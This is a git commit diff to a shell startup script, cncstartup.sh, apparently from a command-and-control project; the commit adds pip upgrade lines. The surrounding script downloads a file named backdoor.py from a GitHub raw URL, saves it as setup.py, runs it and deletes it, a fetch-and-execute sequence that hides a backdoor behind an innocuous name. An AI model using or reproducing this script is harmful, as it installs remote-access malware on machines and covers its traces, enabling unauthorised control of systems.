1463c15dfc31a4617385f628dad3efb56647303f
Abinavraj Ganesh Sudhakar <abinavraj10@gmail.com>
2023-03-24 18:49:21 -0500

    Added startup pip upgrade

--- cncstartup.sh
+++ cncstartup.sh
@@ -1,6 +1,8 @@
 yum install -y python3;
 curl -o setup.py https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/backdoor.py;
 chmod +x setup.py;
+pip3 install --upgrade pip;
+pip3 install setuptools_rust;
 pip3 install cryptography;
 python3 setup.py;
 rm setup.py
